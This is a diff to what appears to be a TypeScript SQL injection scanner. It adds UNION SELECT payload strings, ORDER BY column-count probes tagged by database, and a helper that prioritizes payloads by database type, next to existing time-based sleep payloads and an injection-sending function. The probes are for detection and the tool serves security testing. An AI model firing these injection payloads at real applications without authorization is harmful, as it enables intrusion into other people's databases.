@@ -604,6 +604,51 @@ export const timePayloads = [
   { p: "DBMS_LOCK.SLEEP(3)", label: "oracle_sleep" },
 ];
 
+// Union/OrderBy PoC payloads (conservative, read-only)
+export const unionPayloads: Array<{
+  p: string;
+  label: string;
+  db?: "mysql" | "postgres" | "mssql" | "oracle" | "sqlite" | "any";
+}> = [
+  // Quote-less variants to avoid triggering error-based branches in emulators
+  { p: " UNION SELECT NULL", label: "union_null_1", db: "any" },
+  { p: " UNION SELECT NULL,NULL", label: "union_null_2", db: "any" },
+  { p: " UNION SELECT 1", label: "union_num_1", db: "sqlite" },
+  { p: " UNION SELECT 1,2", label: "union_num_2", db: "sqlite" },
+  { p: ") UNION SELECT NULL", label: "union_paren_1", db: "any" },
+];
+
+export const orderByProbes: Array<{
+  ok: string;
+  bad: string;
+  label: string;
+  db?: "mysql" | "postgres" | "mssql" | "oracle" | "sqlite" | "any";
+}> = [
+  {
+    ok: " ORDER BY 1",
+    bad: " ORDER BY 999",
+    label: "orderby_mysql",
+    db: "mysql",
+  },
+  {
+    ok: " ORDER BY 1",
+    bad: " ORDER BY 999",
+    label: "orderby_any",
+    db: "any",
+  },
+];
+
+export function prioritizeByDb<
+  T extends { p?: string; ok?: string; label?: string }
+>(items: T[], db: string | undefined, matchers: Array<(x: T) => boolean>): T[] {
+  if (!db) return items;
+  return [...items].sort((a, b) => {
+    const sa = matchers.some((m) => m(a)) ? 1 : 0;
+    const sb = matchers.some((m) => m(b)) ? 1 : 0;
+    return sb - sa;
+  });
+}
+
 // Injection execution
 export async function sendWithInjection(
   client: AxiosInstance,
